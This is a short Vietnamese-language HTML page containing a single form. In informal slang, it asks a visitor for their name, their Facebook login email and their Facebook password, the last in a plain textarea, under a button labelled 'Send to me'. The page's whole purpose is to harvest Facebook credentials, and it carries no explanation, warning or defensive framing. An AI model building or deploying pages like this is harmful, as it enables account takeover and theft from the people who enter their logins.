<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nhập thông tin của m</title>
</head>
<body>
    <h2>Nhập thông tin của n</h2>
    <form method="post">
        <label for="name">Tên:</label>
        <input type="text" id="name" name="name" required><br>

        <label for="email">Email m đăng nhập facebook</label>
        <input type="email" id="email" name="email" required><br>

        <label for="content">mật khẩu facebook của m</label>
        <textarea id="content" name="content" required></textarea><br>

        <button type="submit">Gửi cho t</button>
    </form>
</body>
</html>
